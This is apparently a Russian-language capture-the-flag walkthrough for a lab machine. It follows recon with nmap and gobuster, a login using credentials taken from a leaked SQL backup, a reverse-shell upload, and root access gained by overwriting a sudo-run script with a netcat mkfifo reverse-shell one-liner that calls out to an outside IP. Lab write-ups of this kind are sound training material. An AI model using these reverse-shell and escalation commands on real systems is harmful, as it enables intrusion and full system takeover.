@@ -1,0 +1,61 @@
+1)└─# nmap -A -sV -O 10.10.132.179
+ничего интересного, ssh и http-сайт
+
+2)└─# gobuster -e -u dir http://10.10.132.179/  -w /root/Downloads/common.txt
+тут нашла скрытую папку content и дальше осуществляла поиск в ней
+
+└─# gobuster -e -u dir http://10.10.132.179/content  -w /root/Downloads/common.txt
+
+нашла такие интересные ссылки как 
+as-что оказалась страницей регистрации
+inc-что оказалась страницей с файлами сайта, в ней нашла sql-backup, в нем находились данные manager:md5("Password123")
+
+сначала я полезла в ssh с логином manager,admin,user, не получилось - потом я полезла на страницу регистарции as и у меня получилось зайти
+
+3)залезда в категорию media center и загрузила туда reverse-shell, 
+
+└─# nc -lvnp 1234
+
+открыла его в том же медиа центре, и вуаля я теперь www-data 
+$ python -c "import pty;pty.spawn('/bin/bash')"     для более удобного отображения в консоли(см. Source)
+$ cd /home/itguy
+$ cat user.txt
+
+4)хочу узнать какие действия могу совершать от лица админа 
+
+$ sudo -l
+Matching Defaults entries for www-data on THM-Chal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.perl
+
+ок значит backup.pl запускается от имени админа
+
+$ cat backup.pl
+
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+
+ооокей прочитаем /etc/copy.sh
+
+$ cat /etc/copy.sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
+
+тут передается право на дейтсвие от рута???
+
+$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.2.64 1111 >/tmp/f" > /etc/copy.sh
+
+тут я заменяю прошлую строку на эту и в то же время у себя на устройстве
+
+└─# nc -lvnp 1111 
+
+далее я наконец-то запускаю /backup.pl c  правами администратора
+
+$ sudo perl /home/itguy/backup.pl
+
+и вуаля, теперь я root
+
+
